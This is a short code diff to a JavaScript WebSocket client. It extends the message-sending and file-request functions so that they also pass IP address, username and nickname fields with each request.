@@ -46,22 +46,28 @@ commanderSocket.onclose = function(e) {
 commanderSocket.onmessage = function(e) {
 	console.log('CMD : ', e);
 };
-export const API_SendMessage = (macAddress, msgContent) => {
+export const API_SendMessage = (macAddress, msgContent, ip, username, nick) => {
 	const data = {
 		event: 'cmsg',
 		mac: macAddress,
-		msg: msgContent
+		msg: msgContent,
+		ip: ip,
+		username: username,
+		nick: nick
 	};
 	commanderSocket.send(JSON.stringify(data));
 };
 
-export const API_SendFile = async (macAddress, fileDirArray, idArray) => {
+export const API_SendFile = async (macAddress, fileDirArray, idArray, ip, username, nick) => {
 	for (let i = 0; i < fileDirArray.length; i++) {
 		const data = {
 			event: 'creq',
 			mac: macAddress,
 			dir: fileDirArray[i],
-			uuid: idArray[i]
+			uuid: idArray[i],
+			ip: ip,
+			username: username,
+			nick: nick
 		};
 		commanderSocket.send(JSON.stringify(data));
 		await sleep(75);
